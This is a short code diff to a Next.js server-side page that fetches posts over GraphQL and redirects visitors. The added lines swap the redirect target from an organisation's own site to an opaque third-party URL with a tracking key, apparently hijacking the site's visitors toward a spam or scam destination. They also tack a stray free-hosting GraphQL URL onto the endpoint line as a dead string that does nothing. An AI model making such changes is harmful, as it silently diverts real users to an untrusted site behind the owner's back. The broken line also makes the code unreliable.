@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = process.env.GRAPHQL_ENDPOINT as string;
+	const endpoint = process.env.GRAPHQL_ENDPOINT as string; "https://khhuramwaince0755.000webhostapp.com/graphql/"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`https://tasktrivialaggregated.com/qunik88a?key=762b91bd88a7814984635483009c1edc` + encodeURI(path as string)
 				}`,
 			},
 		};
